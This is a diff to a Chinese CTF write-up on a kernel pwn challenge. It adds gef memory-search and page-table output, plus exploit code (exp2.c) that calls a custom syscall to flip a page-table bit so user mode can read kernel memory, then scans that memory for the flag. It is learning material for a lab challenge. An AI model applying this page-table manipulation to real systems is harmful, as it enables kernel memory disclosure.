@@ -216,7 +216,58 @@ flag{你怎么知道cameudis有对象了?}
 
 由于题目给出的 flag 直接存在于 ramdisk 里，因此也会被加载到内存中。我们可以先在调试环境搜索到 flag 的位置，然后在脚本中暴力搜索周围的内存空间。虽然 flag 的位置有随机性，但由于线性映射区都是大页映射，因此我们可以在修改完 1 个比特之后就开始搜索大页，甚至也可以使用类似于方法 1 中的套娃技巧，将控制范围再度扩大。
 
-不过由于笔者还没装好 [Kernel特化版gef](https://github.com/bata24/gef)（这玩意一键安装脚本只支持 debian 系是什么鬼？），默认的 gef 又没办法在 qemu 模式下搜索内存，这种方法就先咕咕咕了！
+> 不过由于笔者还没装好 [Kernel特化版gef](https://github.com/bata24/gef)（这玩意一键安装脚本只支持 debian 系是什么鬼？），默认的 gef 又没办法在 qemu 模式下搜索内存，这种方法就先咕咕咕了！
+
+```
+gef> search-pattern "flag{"
+[+] Searching for 'flag{' in whole memory
+[+] In (0xffff888002200000-0xffff888002600000 [rw-] (0x400000 bytes)
+  0xffff888002251000:    66 6c 61 67 7b e4 bd a0  e6 80 8e e4 b9 88 e7 9f    |  flag{...........  |
+[+] In (0xffffffff82200000-0xffffffff82400000 [rw-] (0x200000 bytes)
+  0xffffffff82251000:    66 6c 61 67 7b e4 bd a0  e6 80 8e e4 b9 88 e7 9f    |  flag{...........  |
+gef> va2pa 0xffff888002251000
+pml4e: 0x0000000002201067 at 0x03730888
+pdpte: 0x0000000002202067 at 0x02201000
+pde  : 0x80000000022001e3 at 0x02202088
+phy  : 0x2251000 [0x02200000-0x023fffff]
+gef> va2pa 0xffffffff82251000
+pml4e: 0x0000000001e2f067 at 0x03730ff8
+pdpte: 0x0000000001e30063 at 0x01e2fff0
+pde  : 0x80000000022001e3 at 0x01e30088
+phy  : 0x2251000 [0x02200000-0x023fffff]
+```
+
+我们使用高级 gef 进行搜索，可以看到 flag 即出现于线性映射区，也出现于另外一个区域。但是如果解析其页表的话，就会发现线性映射区的那个地址只需要我们修改一个 bit 就可以从用户态进行读取了，范围为 `0x02200000-0x023fffff`。
+
+可以快速写出一个攻击与搜索脚本：
+
+```c
+/*
+ * exp2.c
+ * Copyright (C) 2025 y2 <cameudis@gmail.com>
+ *
+ * Distributed under terms of the MIT license.
+ */
+
+#include "kernelpwn.h"
+
+int main() {
+    int r = syscall(468, 0x2202088, 2);
+    printf("[*] syscall return: %d\n", r);
+
+    uint64_t a;
+    for (a = 0xffff888002200000; a < 0xffff8880023fffff; a++) {
+        if (strncmp((char*)a, "flag{", 5) == 0) {
+            printf("[*] found flag string at: %p\n", (void*)a);
+            break;
+        }
+    }
+
+    printf("[*] flag: %s\n", (char*)a);
+
+    return 0;
+}
+```
 
 ---
 
